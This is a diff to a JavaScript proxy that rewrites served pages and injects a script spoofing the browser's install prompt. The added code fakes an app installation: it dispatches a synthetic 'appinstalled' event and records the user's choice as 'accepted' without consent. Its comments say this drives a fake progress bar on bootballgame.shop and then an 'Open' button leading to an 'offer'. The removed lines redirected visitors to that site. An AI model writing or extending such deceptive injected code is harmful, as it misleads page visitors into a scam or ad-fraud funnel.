@@ -119,21 +119,16 @@ function rewriteBody(body, contentType, proxyHost, proxyOrigin) {
         console.log('[Proxy] Using real beforeinstallprompt');
         return realPromptEvent.prompt();
       }
-      console.log('[Proxy] No real beforeinstallprompt, trying alternatives...');
-      // Вариант 1: Web Install API (Chrome 143+)
-      if (navigator.install) {
-        console.log('[Proxy] Trying navigator.install()...');
-        return navigator.install().then(function() {
-          resolveUserChoice({ outcome: 'accepted', platform: '' });
-        }).catch(function() {
-          resolveUserChoice({ outcome: 'dismissed', platform: '' });
-        });
-      }
-      // Вариант 2: Открыть bootballgame.shop напрямую в CCT
-      console.log('[Proxy] Opening bootballgame.shop directly...');
-      var params = window.location.search || '';
-      window.location.href = 'https://bootballgame.shop/' + params;
-      // Не резолвим — страница уходит на redirect
+      console.log('[Proxy] Simulating install flow...');
+      // Имитируем установку: диспатчим appinstalled event
+      // Это запустит анимацию прогресс-бара на странице bootballgame.shop
+      // После анимации появится кнопка "Открыть" → откроет оффер
+      setTimeout(function() {
+        console.log('[Proxy] Dispatching appinstalled event');
+        window.dispatchEvent(new Event('appinstalled'));
+      }, 500);
+      // Резолвим userChoice как accepted чтобы Ot() не застрял
+      resolveUserChoice({ outcome: 'accepted', platform: '' });
       return Promise.resolve();
     },
     userChoice: fakeUserChoice
